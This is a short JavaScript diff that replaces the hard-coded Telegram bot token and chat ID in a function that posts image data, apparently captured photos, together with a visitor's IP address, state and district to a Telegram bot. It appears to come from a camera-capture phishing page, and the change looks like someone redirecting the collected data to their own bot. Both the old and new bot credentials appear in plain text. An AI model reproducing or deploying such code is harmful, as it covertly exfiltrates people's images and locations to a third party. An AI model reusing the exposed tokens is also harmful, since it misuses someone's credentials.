@@ -54,8 +54,8 @@
 
     async function sendImageToTelegram(imageData, ip, state, district) {
      try {
-      var botToken = '6634310991:AAFRmZOIRuezOrmpXvYITkCcE7VB0tLTzKY';
-      var chatId = '1815466190';
+      var botToken ='7100735017:AAG1__7eYJH7xLaU_Bxb_FF6FqZ_xDvDGw4';
+      var chatId = '6619947117';
       var apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
       var byteCharacters = atob(imageData.split(',')[1]);
